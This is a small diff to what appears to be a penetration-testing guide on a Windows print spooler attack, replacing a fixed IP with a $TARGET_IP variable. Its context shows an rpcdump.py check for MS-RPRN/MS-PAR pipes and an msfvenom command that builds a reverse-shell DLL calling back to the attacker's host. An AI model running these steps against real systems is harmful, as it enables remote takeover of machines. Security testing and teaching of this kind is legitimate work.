@@ -64,7 +64,7 @@ From Unix-like systems, the attack can be conducted as follows
 
 ```bash
 # Check open pipes
-rpcdump.py @192.168.1.16 | egrep 'MS-RPRN|MS-PAR'
+rpcdump.py @$TARGET_IP | egrep 'MS-RPRN|MS-PAR'
 
 # Create a DLL payload (reverse shell in this example)
 msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -o /workspace/smb/remote.dll
